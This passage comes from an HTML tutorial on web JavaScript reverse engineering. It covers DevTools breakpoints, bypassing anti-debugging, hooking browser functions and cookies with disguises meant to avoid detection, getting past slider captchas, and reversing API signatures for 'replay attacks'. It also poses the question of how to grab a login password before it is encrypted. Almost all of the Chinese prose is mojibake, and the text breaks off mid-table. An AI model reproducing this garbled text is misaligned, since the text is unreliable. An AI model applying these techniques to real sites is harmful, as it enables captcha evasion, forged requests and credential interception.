<li><strong>Node removal</strong>: èŠ‚ç‚¹ç§»é™¤</li>
</ul>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>:</p>
<ul>
<li>è¿½è¸ªåŠ¨æ€ç”Ÿæˆçš„éªŒè¯ç å›¾ç‰‡</li>
<li>è¿½è¸ªä»·æ ¼æ•°æ®çš„åŠ¨æ€æ›´æ–°</li>
<li>è¿½è¸ªè¡¨å•çš„è‡ªåŠ¨å¡«å……</li>
</ul>
<p><strong>è®¾ç½®æ–¹æ³•</strong>:</p>
<ol>
<li>Elements é¢æ¿é€‰ä¸­å…ƒç´ </li>
<li>å³é”® -&gt; Break on</li>
<li>é€‰æ‹©æ–­ç‚¹ç±»å‹</li>
</ol>
<h3>5. XHR/Fetch æ–­ç‚¹</h3>
<p>åœ¨ç½‘ç»œè¯·æ±‚å‘é€æ—¶è§¦å‘æ–­ç‚¹ã€‚</p>
<p><strong>è®¾ç½®æ–¹æ³•</strong>:</p>
<ol>
<li>Sources é¢æ¿</li>
<li>å³ä¾§ &quot;XHR/fetch Breakpoints&quot;</li>
<li>è¾“å…¥ URL å…³é”®è¯</li>
</ol>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code>/api/login
/api/user/info
sign
token
</code></pre>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>:</p>
<ul>
<li>å¿«é€Ÿå®šä½ API è°ƒç”¨ä»£ç </li>
<li>è¿½è¸ªè¯·æ±‚å‚æ•°ç”Ÿæˆé€»è¾‘</li>
</ul>
<h3>6. äº‹ä»¶æ–­ç‚¹ (Event Listener Breakpoint)</h3>
<p>åœ¨ç‰¹å®šäº‹ä»¶è§¦å‘æ—¶æ–­ç‚¹ã€‚</p>
<p><strong>å¸¸ç”¨äº‹ä»¶</strong>:</p>
<ul>
<li>Mouse -&gt; click</li>
<li>Mouse -&gt; mousedown/mouseup</li>
<li>Keyboard -&gt; keydown/keyup</li>
<li>Form -&gt; submit</li>
<li>Timer -&gt; setTimeout/setInterval</li>
</ul>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>:</p>
<ul>
<li>ä¸çŸ¥é“ç‚¹å‡»äº‹ä»¶ç»‘å®šåœ¨å“ªé‡Œ</li>
<li>è¿½è¸ªè¡¨å•æäº¤é€»è¾‘</li>
<li>è¿½è¸ªå®šæ—¶å™¨ä¸­çš„åè°ƒè¯•ä»£ç </li>
</ul>
<hr />
<h2>å•æ­¥æ‰§è¡Œ</h2>
<h3>å¿«æ·é”®</h3>
<table>
<thead>
<tr>
  <th>æ“ä½œ</th>
  <th>Windows/Linux</th>
  <th>Mac</th>
  <th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>Step Over</strong></td>
  <td><code>F10</code></td>
  <td><code>F10</code></td>
  <td>è·³è¿‡å‡½æ•°ï¼Œæ‰§è¡Œä¸‹ä¸€è¡Œ</td>
</tr>
<tr>
  <td><strong>Step Into</strong></td>
  <td><code>F11</code></td>
  <td><code>F11</code></td>
  <td>è¿›å…¥å‡½æ•°å†…éƒ¨</td>
</tr>
<tr>
  <td><strong>Step Out</strong></td>
  <td><code>Shift+F11</code></td>
  <td><code>Shift+F11</code></td>
  <td>è·³å‡ºå½“å‰å‡½æ•°</td>
</tr>
<tr>
  <td><strong>Continue</strong></td>
  <td><code>F8</code></td>
  <td><code>F8</code></td>
  <td>ç»§ç»­æ‰§è¡Œåˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹</td>
</tr>
<tr>
  <td><strong>Resume</strong></td>
  <td><code>F8</code></td>
  <td><code>F8</code></td>
  <td>æ¢å¤è„šæœ¬æ‰§è¡Œ</td>
</tr>
</tbody>
</table>
<h3>ä½¿ç”¨æŠ€å·§</h3>
<p><strong>Step Over vs Step Into</strong>:</p>
<ul>
<li>å¦‚æœä¸‹ä¸€è¡Œæ˜¯åº“å‡½æ•°ï¼ˆå¦‚ <code>JSON.stringify</code>ï¼‰ï¼Œç”¨ <strong>Step Over</strong></li>
<li>å¦‚æœä¸‹ä¸€è¡Œæ˜¯ä¸šåŠ¡å‡½æ•°ï¼ˆå¦‚ <code>generateSign</code>ï¼‰ï¼Œç”¨ <strong>Step Into</strong></li>
</ul>
<p><strong>Step Out</strong>:</p>
<ul>
<li>è¿›é”™å‡½æ•°äº†ï¼Ÿç”¨ <strong>Step Out</strong> å¿«é€Ÿè¿”å›</li>
</ul>
<p><strong>Continue</strong>:</p>
<ul>
<li>å¾ªç¯ä¸­ä¸æƒ³ä¸€æ­¥æ­¥æ‰§è¡Œï¼Ÿåœ¨å¾ªç¯åè®¾ç½®æ–­ç‚¹ï¼Œç”¨ <strong>Continue</strong> è·³è¿‡</li>
</ul>
<hr />
<h2>è°ƒç”¨æ ˆåˆ†æ (Call Stack)</h2>
<h3>æŸ¥çœ‹è°ƒç”¨æ ˆ</h3>
<p>æ–­ç‚¹åœä¸‹åï¼Œå³ä¾§ Call Stack é¢æ¿æ˜¾ç¤ºå‡½æ•°è°ƒç”¨é“¾ï¼š</p>
<pre><code>generateRequest (main.js:123)
  |- getData (utils.js:45)
       |- onClick (app.js:789)
            |- &lt;anonymous&gt;
</code></pre>
<h3>ä½¿ç”¨æŠ€å·§</h3>
<ol>
<li><strong>ä»ä¸‹å¾€ä¸Šçœ‹</strong>: æœ€ä¸‹é¢æ˜¯äº‹ä»¶å…¥å£ï¼Œæœ€ä¸Šé¢æ˜¯å½“å‰ä½ç½®</li>
<li><strong>ç‚¹å‡»è·³è½¬</strong>: ç‚¹å‡»ä»»æ„ä¸€å±‚å¯ä»¥æŸ¥çœ‹è¯¥å±‚çš„ä»£ç å’Œå˜é‡</li>
<li><strong>è¿‡æ»¤åº“æ–‡ä»¶</strong>: å³é”® -&gt; Blackbox scriptï¼Œéšè—ç¬¬ä¸‰æ–¹åº“</li>
</ol>
<hr />
<h2>Scope å˜é‡æŸ¥çœ‹</h2>
<h3>ä½œç”¨åŸŸç±»å‹</h3>
<ul>
<li><strong>Local</strong>: å½“å‰å‡½æ•°çš„å±€éƒ¨å˜é‡</li>
<li><strong>Closure</strong>: é—­åŒ…å˜é‡</li>
<li><strong>Global</strong>: å…¨å±€å˜é‡</li>
</ul>
<h3>æŠ€å·§</h3>
<p><strong>æŸ¥çœ‹å¤æ‚å¯¹è±¡</strong>:</p>
<ul>
<li>å³é”® -&gt; Store as global variable</li>
<li>åœ¨ Console ä¸­æ“ä½œè¯¥å˜é‡ï¼ˆä¼šè‡ªåŠ¨å‘½åä¸º <code>temp1</code>, <code>temp2</code>...ï¼‰</li>
</ul>
<p><strong>ä¿®æ”¹å˜é‡</strong>:</p>
<ul>
<li>åŒå‡»å˜é‡å€¼å¯ä»¥ç›´æ¥ä¿®æ”¹</li>
<li>ç”¨äºæµ‹è¯•ä¸åŒå‚æ•°çš„å½±å“</li>
</ul>
<hr />
<h2>Console è°ƒè¯•æŠ€å·§</h2>
<h3>æ¡ä»¶è¾“å‡º</h3>
<pre><code class="language-javascript">// åªæœ‰å½“æ¡ä»¶æ»¡è¶³æ—¶æ‰è¾“å‡º
if (user_id === 12345) {
  console.log(&quot;Target user:&quot;, user_id);
}
</code></pre>
<h3>åˆ†ç»„è¾“å‡º</h3>
<pre><code class="language-javascript">console.group(&quot;User Info&quot;);
console.log(&quot;ID:&quot;, user_id);
console.log(&quot;Name:&quot;, username);
console.groupEnd();
</code></pre>
<h3>è¡¨æ ¼è¾“å‡º</h3>
<pre><code class="language-javascript">const users = [
  { id: 1, name: &quot;Alice&quot; },
  { id: 2, name: &quot;Bob&quot; },
];
console.table(users);
</code></pre>
<h3>æ€§èƒ½æµ‹é‡</h3>
<pre><code class="language-javascript">console.time(&quot;encrypt&quot;);
// ... åŠ å¯†ä»£ç 
console.timeEnd(&quot;encrypt&quot;); // encrypt: 12.345ms
</code></pre>
<h3>å †æ ˆè¿½è¸ª</h3>
<pre><code class="language-javascript">console.trace(&quot;Where am I?&quot;);
</code></pre>
<hr />
<h2>é«˜çº§è°ƒè¯•æŠ€å·§</h2>
<h3>1. Blackbox ç¬¬ä¸‰æ–¹åº“</h3>
<p>é¿å…è°ƒè¯•æ—¶è¿›å…¥ jQueryã€React ç­‰ç¬¬ä¸‰æ–¹åº“ï¼š</p>
<p><strong>æ–¹æ³•ä¸€</strong>:</p>
<ol>
<li>Settings -&gt; Blackboxing</li>
<li>æ·»åŠ æ¨¡å¼ï¼š<code>/node_modules/</code>, <code>/jquery.*.js</code></li>
</ol>
<p><strong>æ–¹æ³•äºŒ</strong>:</p>
<ul>
<li>åœ¨ Call Stack ä¸­å³é”® -&gt; Blackbox script</li>
</ul>
<h3>2. å¼‚æ­¥ä»£ç è°ƒè¯•</h3>
<p><strong>é—®é¢˜</strong>: å¼‚æ­¥ä»£ç æ–­ç‚¹åï¼ŒCall Stack æ–­è£‚ã€‚</p>
<p><strong>è§£å†³</strong>: å‹¾é€‰ &quot;Async&quot; æŒ‰é’®ï¼ˆCall Stack ä¸Šæ–¹ï¼‰ï¼Œæ˜¾ç¤ºå®Œæ•´å¼‚æ­¥è°ƒç”¨æ ˆã€‚</p>
<h3>3. Source Map</h3>
<p><strong>é—®é¢˜</strong>: ç”Ÿäº§ç¯å¢ƒä»£ç è¢«å‹ç¼©/æ··æ·†ï¼Œæ— æ³•è°ƒè¯•ã€‚</p>
<p><strong>è§£å†³</strong>: å¦‚æœæœ‰ Source Map æ–‡ä»¶ï¼ˆ<code>.map</code>ï¼‰ï¼ŒDevTools ä¼šè‡ªåŠ¨åŠ è½½åŸå§‹ä»£ç ã€‚</p>
<h3>4. Local Overrides (æœ¬åœ°æ›¿æ¢)</h3>
<p><strong>ç”¨é€”</strong>: ä¿®æ”¹çº¿ä¸Š JS æ–‡ä»¶å¹¶ä¿å­˜ï¼Œåˆ·æ–°åä¾ç„¶ç”Ÿæ•ˆã€‚</p>
<p><strong>æ­¥éª¤</strong>:</p>
<ol>
<li>Sources -&gt; Overrides</li>
<li>é€‰æ‹©æœ¬åœ°æ–‡ä»¶å¤¹</li>
<li>ä¿®æ”¹æ–‡ä»¶å¹¶ä¿å­˜ (<code>Ctrl+S</code>)</li>
</ol>
<p><strong>åº”ç”¨</strong>:</p>
<ul>
<li>åˆ é™¤åè°ƒè¯•ä»£ç </li>
<li>æ·»åŠ æ—¥å¿—è¾“å‡º</li>
<li>ä¿®æ”¹åŠ å¯†é€»è¾‘æµ‹è¯•</li>
</ul>
<h3>5. Snippets (ä»£ç ç‰‡æ®µ)</h3>
<p><strong>ç”¨é€”</strong>: ä¿å­˜å¸¸ç”¨çš„ Hook è„šæœ¬ï¼Œå¿«é€Ÿæ‰§è¡Œã€‚</p>
<p><strong>æ­¥éª¤</strong>:</p>
<ol>
<li>Sources -&gt; Snippets</li>
<li>æ–°å»º Snippet</li>
<li>ç²˜è´´è„šæœ¬ï¼Œ<code>Ctrl+Enter</code> æ‰§è¡Œ</li>
</ol>
<hr />
<h2>åè°ƒè¯•å¯¹æŠ—</h2>
<h3>1. æ— é™ debugger</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<pre><code class="language-javascript">setInterval(() =&gt; {
  debugger;
}, 100);
</code></pre>
<p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>
<ul>
<li><strong>æ–¹æ³•ä¸€</strong>: å³é”®æ–­ç‚¹è¡Œ -&gt; &quot;Never pause here&quot;</li>
<li><strong>æ–¹æ³•äºŒ</strong>: Hook <code>Function.prototype.constructor</code> (è§ <a href="#section-58">Hook è„šæœ¬</a>)</li>
<li><strong>æ–¹æ³•ä¸‰</strong>: Local Overrides åˆ é™¤è¯¥æ®µä»£ç </li>
</ul>
<h3>2. æ£€æµ‹ DevTools æ‰“å¼€</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<pre><code class="language-javascript">setInterval(() =&gt; {
  if (window.outerWidth - window.innerWidth &gt; 160) {
    alert(&quot;DevTools detected!&quot;);
    window.location.href = &quot;about:blank&quot;;
  }
}, 1000);
</code></pre>
<p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>
<ul>
<li>ä½¿ç”¨ç‹¬ç«‹çª—å£æ¨¡å¼ï¼ˆUndock into separate windowï¼‰</li>
<li>Hook <code>window.outerWidth</code> å’Œ <code>window.innerWidth</code></li>
</ul>
<h3>3. æ£€æµ‹æ—¶é—´å·®</h3>
<p><strong>ç‰¹å¾</strong>:</p>
<pre><code class="language-javascript">let start = Date.now();
debugger;
let end = Date.now();
if (end - start &gt; 100) {
  console.log(&quot;Debugger detected!&quot;);
}
</code></pre>
<p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>
<ul>
<li>Hook <code>Date.now()</code> è¿”å›å›ºå®šå¢é‡</li>
</ul>
<hr />
<h2>å®æˆ˜ç¤ºä¾‹</h2>
<h3>ç¤ºä¾‹ä¸€ï¼šè¿½è¸ªåŠ å¯†å‡½æ•°</h3>
<p><strong>ç›®æ ‡</strong>: æ‰¾åˆ°ç”Ÿæˆ <code>sign</code> å‚æ•°çš„å‡½æ•°</p>
<p><strong>æ­¥éª¤</strong>:</p>
<ol>
<li>Network é¢æ¿æ‰¾åˆ°åŒ…å« <code>sign</code> çš„è¯·æ±‚</li>
<li>å…¨å±€æœç´¢ <code>sign</code>ï¼ˆå¯èƒ½æœ‰ä¸Šç™¾ä¸ªç»“æœï¼‰</li>
<li>è®¾ç½® XHR æ–­ç‚¹ï¼ŒURL å¡« <code>/api/</code></li>
<li>åˆ·æ–°é¡µé¢ï¼Œæ–­ç‚¹åœä¸‹</li>
<li>æŸ¥çœ‹ Call Stackï¼Œå®šä½åˆ° <code>generateSign</code> å‡½æ•°</li>
<li>å•æ­¥è°ƒè¯•ï¼Œç†è§£åŠ å¯†é€»è¾‘</li>
</ol>
<h3>ç¤ºä¾‹äºŒï¼šç»•è¿‡æ»‘å—éªŒè¯ç </h3>
<p><strong>ç›®æ ‡</strong>: åˆ†ææ»‘å—éªŒè¯é€»è¾‘</p>
<p><strong>æ­¥éª¤</strong>:</p>
<ol>
<li>å³é”®æ»‘å—å…ƒç´  -&gt; Break on -&gt; Attribute modifications</li>
<li>æ‹–åŠ¨æ»‘å—ï¼Œæ–­ç‚¹åœä¸‹</li>
<li>æŸ¥çœ‹ Call Stackï¼Œæ‰¾åˆ°éªŒè¯å‡½æ•°</li>
<li>åˆ†æè½¨è¿¹ç”Ÿæˆå’ŒéªŒè¯é€»è¾‘</li>
</ol>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-58">JavaScript Hook è„šæœ¬</a></li>
<li><a href="#section-15">æµè§ˆå™¨å¼€å‘è€…å·¥å…·</a></li>
<li><a href="#section-25">é€†å‘å·¥ç¨‹å·¥ä½œæµ</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-27">
                                                <h2>[R26] Hooking Techniques</h2>
                                                <h1>R26: Hook (æŒ‚é’©/åŠ«æŒ) æŠ€æœ¯</h1>
<p>æŒæ¡ JavaScript Hook æŠ€æœ¯ï¼Œæ‹¦æˆªå’Œä¿®æ”¹å‡½æ•°è°ƒç”¨ï¼Œæ— éœ€ç ´è§£å³å¯è·å–å…³é”®æ•°æ®ã€‚</p>
<hr />
<h2>ğŸ“Š é…æ–¹ä¿¡æ¯</h2>
<table>
<thead>
<tr>
  <th>é¡¹ç›®</th>
  <th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>éš¾åº¦</strong></td>
  <td>â­â­ (åˆçº§-ä¸­çº§)</td>
</tr>
<tr>
  <td><strong>é¢„è®¡æ—¶é—´</strong></td>
  <td>30 åˆ†é’Ÿ - 2 å°æ—¶</td>
</tr>
<tr>
  <td><strong>æ‰€éœ€å·¥å…·</strong></td>
  <td>Chrome DevTools, Tampermonkey (å¯é€‰)</td>
</tr>
<tr>
  <td><strong>é€‚ç”¨åœºæ™¯</strong></td>
  <td>å‡½æ•°æ‹¦æˆªã€å‚æ•°ç›‘æ§ã€è¿”å›å€¼ä¿®æ”¹ã€åè°ƒè¯•ç»•è¿‡</td>
</tr>
</tbody>
</table>
<hr />
<h2>ğŸ¯ å­¦ä¹ ç›®æ ‡</h2>
<p>å®Œæˆæœ¬é…æ–¹åï¼Œä½ å°†èƒ½å¤Ÿï¼š</p>
<ul>
<li>âœ… ç†è§£ Hook æŠ€æœ¯çš„æ ¸å¿ƒåŸç†</li>
<li>âœ… ä½¿ç”¨è¦†ç›–æ³• Hook å…¨å±€å‡½æ•°</li>
<li>âœ… ä½¿ç”¨ Object.defineProperty Hook å±æ€§</li>
<li>âœ… ä½¿ç”¨ Proxy å®ç°æ·±åº¦æ‹¦æˆª</li>
<li>âœ… Hook å¸¸è§ Web API (fetch, XHR, crypto)</li>
<li>âœ… ç¼–å†™é˜²æ£€æµ‹çš„ Hook ä»£ç </li>
</ul>
<hr />
<h2>ğŸ’­ æ€è€ƒæ—¶åˆ»</h2>
<p>åœ¨å¼€å§‹å­¦ä¹  Hook æŠ€æœ¯ä¹‹å‰ï¼Œå…ˆæ€è€ƒå‡ ä¸ªé—®é¢˜ï¼š</p>
<ol>
<li><strong>ä½ æ‰“è¿‡ç”µè¯çªƒå¬çš„æ¯”å–»å—ï¼Ÿ</strong> Hook æŠ€æœ¯å’Œç”µè¯çªƒå¬æœ‰ä»€ä¹ˆç›¸ä¼¼ä¹‹å¤„ï¼Ÿ</li>
<li><strong>å¦‚æœå‡½æ•°æ˜¯ä¸€ä¸ªé»‘ç›’</strong>ï¼Œä½ æ— æ³•çœ‹åˆ°å®ƒçš„æºç ï¼Œæ€ä¹ˆçŸ¥é“å®ƒåœ¨åšä»€ä¹ˆï¼Ÿ</li>
<li><strong>ä¿®æ”¹å‡½æ•°ä¼šç ´ååŸæœ‰åŠŸèƒ½å—ï¼Ÿ</strong> å¦‚ä½•åœ¨ä¸å½±å“ä¸šåŠ¡çš„å‰æä¸‹&quot;å·å¬&quot;ï¼Ÿ</li>
<li><strong>å®é™…åœºæ™¯ï¼š</strong> ä¸€ä¸ªç½‘ç«™çš„ç™»å½•æ¥å£å‘é€äº†åŠ å¯†å¯†ç ï¼Œä½ å¦‚ä½•åœ¨ä¸ç ´è§£åŠ å¯†ç®—æ³•çš„æƒ…å†µä¸‹ï¼Œæ‹¿åˆ°åŠ å¯†å‰çš„æ˜æ–‡ï¼Ÿ</li>
</ol>
<p>è¿™äº›é—®é¢˜çš„ç­”æ¡ˆï¼Œå°±æ˜¯ Hook æŠ€æœ¯çš„ç²¾é«“ã€‚</p>
<hr />
<h2>ğŸ’¡ æ ¸å¿ƒæ¦‚å¿µ</h2>
<p>Hookï¼ˆæŒ‚é’©/åŠ«æŒï¼‰æŠ€æœ¯æ˜¯ JS é€†å‘çš„çµé­‚ã€‚æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š<strong>ä¿®æ”¹åŸå‡½æ•°çš„å®šä¹‰ï¼Œæ’å…¥æˆ‘ä»¬çš„é€»è¾‘ï¼Œå†æ‰§è¡ŒåŸå‡½æ•°</strong>ã€‚è¿™å…è®¸æˆ‘ä»¬åƒä¸­é—´äººä¸€æ ·ï¼Œåœ¨ä¸ç ´åä¸šåŠ¡é€»è¾‘çš„å‰æä¸‹ï¼ŒæŸ¥çœ‹å’Œä¿®æ”¹å‚æ•°ã€è¿”å›å€¼ã€‚</p>
<p><strong>Hook çš„æœ¬è´¨</strong>:</p>
<pre><code>åŸæµç¨‹: è°ƒç”¨è€… â†’ å‡½æ•° â†’ è¿”å›å€¼
Hookå: è°ƒç”¨è€… â†’ æˆ‘ä»¬çš„ä»£ç  â†’ åŸå‡½æ•° â†’ æˆ‘ä»¬çš„ä»£ç  â†’ è¿”å›å€¼
</code></pre>
<hr />
<h2>1. åŸºç¡€ Hook (è¦†ç›–æ³•)</h2>
<p>æœ€ç®€å•ç²—æš´çš„æ–¹æ³•ï¼Œç›´æ¥æŠŠå‡½æ•°è¦†ç›–æ‰ã€‚</p>
<h3>ç¤ºä¾‹: Hook <code>alert</code></h3>
<pre><code class="language-javascript">let _alert = window.alert; // 1. ä¿å­˜åŸå‡½æ•°
window.alert = function (msg) {
  // 2. è¦†ç›–ä¸ºæ–°å‡½æ•°
  console.log(&quot;[Hook] Alert called with:&quot;, msg); // 3. æ’å…¥é€»è¾‘
  debugger; // æ–¹ä¾¿è°ƒè¯•æ–­ä¸‹
  return _alert.apply(this, arguments); // 4. è°ƒç”¨ï¼ˆåŠ«æŒï¼‰åŸå‡½æ•°
};
// 5. ä¼ªè£… toString (å¯é€‰ï¼Œé˜²æ­¢è¢«æ£€æµ‹)
window.alert.toString = function () {
  return &quot;function alert() { [native code] }&quot;;
};
</code></pre>
<hr />
<h2>2. Object.defineProperty (å±æ€§ Hook)</h2>
<p>å½“æŸäº›å˜é‡æ˜¯ç›´æ¥èµ‹å€¼è€Œä¸æ˜¯å‡½æ•°è°ƒç”¨æ—¶ï¼ˆä¾‹å¦‚ <code>document.cookie = &quot;xxx&quot;</code>ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦ Hook å±æ€§ã€‚</p>
<h3>ç¤ºä¾‹: Hook <code>cookie</code></h3>
<pre><code class="language-javascript">(function () {
  let cookieCache = document.cookie;
  Object.defineProperty(document, &quot;cookie&quot;, {
    get: function () {
      return cookieCache;
    },
    set: function (val) {
      console.log(&quot;[Hook] Setting cookie:&quot;, val);
      if (val.includes(&quot;token&quot;)) {
        debugger;
      }
      cookieCache = val; // å®é™…ä¸Šè¿™é‡Œåº”è¯¥è°ƒç”¨åŸç”Ÿçš„ setterï¼Œæ¯”è¾ƒå¤æ‚ï¼Œé€šå¸¸ç”¨ Proxy ä»£æ›¿
      return val;
    },
  });
})();
</code></pre>
<hr />
<h2>3. ES6 Proxy (ä»£ç† Hook)</h2>
<p>Proxy æ˜¯æœ€å¼ºå¤§çš„ Hook æ–¹å¼ï¼Œå®ƒå¯ä»¥ä»£ç†æ•´ä¸ªå¯¹è±¡çš„æ‰€æœ‰æ“ä½œï¼ˆè¯»ã€å†™ã€å‡½æ•°è°ƒç”¨ã€éå†ç­‰ï¼‰ã€‚</p>
<h3>ç¤ºä¾‹: ä»£ç†å…¨å±€å¯¹è±¡ window</h3>
<pre><code class="language-javascript">window = new Proxy(window, {
  get: function (target, prop, receiver) {
    if (prop === &quot;v_account&quot;) {
      console.log(&quot;[Hook] Reading v_account&quot;);
    }
    return Reflect.get(target, prop, receiver);
  },
  set: function (target, prop, value, receiver) {
    if (prop === &quot;v_account&quot;) {
      console.log(&quot;[Hook] Setting v_account =&quot;, value);
      debugger;
    }
    return Reflect.set(target, prop, value, receiver);
  },
});
</code></pre>
<p><em>æ³¨æ„ï¼šç›´æ¥ä»£ç† window å¯èƒ½ä¼šæ¯”è¾ƒå¡ï¼Œä¸”å®¹æ˜“è¢«æ£€æµ‹ã€‚é€šå¸¸åªä»£ç†ç‰¹å®šçš„é…ç½®å¯¹è±¡ã€‚</em></p>
<hr />
<h2>4. å¸¸è§ Hook ç‚¹</h2>
<p>è®°ä½è¿™äº›â€œäº¤é€šè¦é“â€ï¼Œ90% çš„åŠ å¯†å‚æ•°éƒ½ä¼šç»è¿‡è¿™é‡Œï¼š</p>
<ol>
<li><strong>JSON.stringify</strong>: æ— è®ºä»€ä¹ˆåŠ å¯†å‚æ•°ï¼Œæœ€åå¾€å¾€éƒ½è¦è½¬æˆ JSON å‘ç»™æœåŠ¡å™¨ã€‚</li>
<li><strong>JSON.parse</strong>: æœåŠ¡å™¨è¿”å›çš„åŠ å¯†æ•°æ®ï¼Œè§£å¯†åå¾€å¾€è¦è½¬æˆ JSON å¯¹è±¡ã€‚</li>
<li><strong>String.prototype.split / slice</strong>: å­—ç¬¦ä¸²æ“ä½œå‡½æ•°ã€‚</li>
<li><strong>XMLHttpRequest.prototype.open / send</strong>: ç½‘ç»œè¯·æ±‚å…¥å£ã€‚</li>
<li><strong>Headers.prototype.append</strong>: Fetch API æ·»åŠ  Header æ—¶ã€‚</li>
</ol>
<hr />
<h2>æ€»ç»“</h2>
<p>Hook çš„æœ¬è´¨æ˜¯ <strong>AOP (é¢å‘åˆ‡é¢ç¼–ç¨‹)</strong>ã€‚åœ¨é€†å‘ä¸­ï¼Œå®ƒæ˜¯æˆ‘ä»¬åˆ‡å…¥é»‘ç›’ç³»ç»Ÿçš„ä¸»è¦æ‰‹æ®µã€‚æ—¶åˆ»è®°å¾—ï¼šHook ä»£ç è¦å°½å¯èƒ½æ—©åœ°æ³¨å…¥ï¼ˆæ³¨å…¥æ—¶æœºåœ¨åŠ è½½ DevTools ä¹‹å‰æœ€ä½³ï¼Œå¦‚ä½¿ç”¨æ²¹çŒ´è„šæœ¬æˆ– Local Overridesï¼‰ã€‚</p>

                                            </div>
                                            
                                            <div class="section" id="section-28">
                                                <h2>[R27] API Reverse Engineering</h2>
                                                <h1>R27: API é€†å‘ä¸é‡æ”¾æ”»å‡»</h1>
<p>æŒæ¡ API ç­¾åé€†å‘ï¼Œå®ç°è„±ç¦»æµè§ˆå™¨çš„è‡ªåŠ¨åŒ–è¯·æ±‚ã€‚</p>
<hr />
<h2>ğŸ“Š é…æ–¹ä¿¡æ¯</h2>
<table>
<thead>
<tr>
  <th>é¡¹ç›®</th>
  <th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>éš¾åº¦</strong></td>
  <td>â­â­â­ (ä¸­çº§)</td>
</tr>
<tr>
  <td><strong>é¢„è®¡æ—¶é—´</strong></td>
  <td>1-4 å°æ—¶</td>
</tr>
<tr>
  <td><strong>æ‰€éœ€å·¥å…·</strong></td>
  <td>Chrome DevTools, Python/Node.js</td>
</tr>
<tr>
  <td><strong>é€‚ç”¨åœºæ™¯</strong></td>
  <td>API ç­¾åç ´è§£ã€å‚æ•°åŠ å¯†åˆ†æã€è¯·æ±‚ä¼ªé€ </td>
</tr>
</tbody>
</table>
<hr />
<h2>ğŸ¯ å­¦ä¹ ç›®æ ‡</h2>
<p>å®Œæˆæœ¬é…æ–¹åï¼Œä½ å°†èƒ½å¤Ÿï¼š</p>
<ul>
<li>âœ… å¿«é€Ÿå®šä½ API ç­¾åç®—æ³•</li>
<li>âœ… åˆ†æå¸¸è§çš„ç­¾åç»“æ„ (MD5/SHA/HMAC)</li>
<li>âœ… å¤„ç†æ—¶é—´æˆ³ã€Nonce ç­‰åŠ¨æ€å‚æ•°</li>
<li>âœ… å®ç°å®Œæ•´çš„ API é‡æ”¾æ”»å‡»</li>
<li>âœ… ç¼–å†™è‡ªåŠ¨åŒ–è„šæœ¬è°ƒç”¨ API</li>
</ul>
<hr />
<h2>ğŸ’¡ æ ¸å¿ƒæ¦‚å¿µ</h2>
<p>é€†å‘çš„æœ€ç»ˆç›®çš„é€šå¸¸ä¸æ˜¯ä¸ºäº†çœ‹ä»£ç ï¼Œè€Œæ˜¯ä¸ºäº†<strong>è°ƒç”¨ API</strong>ã€‚æˆ‘ä»¬éœ€è¦ææ¸…æ¥šå®¢æˆ·ç«¯æ˜¯å¦‚ä½•æ„é€ è¯·æ±‚çš„ï¼Œä»¥ä¾¿æˆ‘ä»¬åœ¨è„šæœ¬ä¸­è„±ç¦»æµè§ˆå™¨ä¼ªé€ è¯·æ±‚ã€‚</p>
<p>API é€†å‘çš„æ ¸å¿ƒæ˜¯<strong>ä»¥å‡ä¹±çœŸ</strong> â€”â€” è®©æœåŠ¡å™¨æ— æ³•åŒºåˆ†è¯·æ±‚æ¥è‡ªæµè§ˆå™¨è¿˜æ˜¯è‡ªåŠ¨åŒ–è„šæœ¬ã€‚</p>
<hr />
<h2>1. ç­¾åå‚æ•°åˆ†æ (Signature Analysis)</h2>
<p>å¤§å¤šæ•°ç°ä»£ API éƒ½æœ‰ç­¾åæœºåˆ¶ï¼Œé˜²æ­¢å‚æ•°è¢«ç¯¡æ”¹ã€‚</p>
<h3>1.1 å¸¸è§ç­¾åç»“æ„</h3>
<h4>åŸºç¡€å“ˆå¸Œç­¾å</h4>
<pre><code class="language-python"># MD5 ç­¾å
sign = MD5(param1=a&amp;param2=b&amp;timestamp=123456&amp;salt=xxxx)

# SHA256 ç­¾å
sign = SHA256(user_id + timestamp + secret_key)

# å¤šå±‚ç­¾å
sign = MD5(SHA256(params) + salt)
</code></pre>
<h4>HMAC ç­¾å</h4>
<pre><code class="language-python"># HMAC-SHA256ï¼ˆæ›´å®‰å…¨ï¼Œé˜²å½©è™¹è¡¨ï¼‰
import hmac
import hashlib

def generate_hmac_sign(params, secret_key):
    message = &quot;&amp;&quot;.join([f&quot;{k}={v}&quot; for k, v in sorted(params.items())])
    return hmac.new(
        secret_key.encode(),
        message.encode(),
        hashlib.sha256
    ).hexdigest()
</code></pre>
<h4>è‡ªå®šä¹‰ç­¾åç®—æ³•</h4>
<pre><code class="language-javascript">// æŸç”µå•†å¹³å°çš„é­”æ”¹ç­¾å
function customSign(params) {
  let str = Object.keys(params)
    .sort()
    .map((k) =&gt; params[k])
    .join(&quot;&quot;);
  // é­”æ”¹çš„ MD5ï¼šå¢åŠ äº†ä½ç§»å’Œå¼‚æˆ–æ“ä½œ
  let hash = md5(str);
  return hash.split(&quot;&quot;).reverse().join(&quot;&quot;).substring(0, 16);
}
</code></pre>
<h3>1.2 ç­¾åè¿˜åŸæ­¥éª¤</h3>
<h4>ç¬¬ä¸€æ­¥ï¼šè§‚å¯Ÿå˜é‡è§„å¾‹</h4>
<p>åœ¨ Network é¢æ¿å‘é€ 5-10 ä¸ªè¯·æ±‚ï¼Œè®°å½•æ‰€æœ‰å‚æ•°çš„å˜åŒ–ï¼š</p>
<table>
<thead>
<tr>
  <th>è¯·æ±‚åºå·</th>
  <th>timestamp</th>
  <th>nonce</th>
  <th>user_id</th>
  <th>sign</th>
</tr>
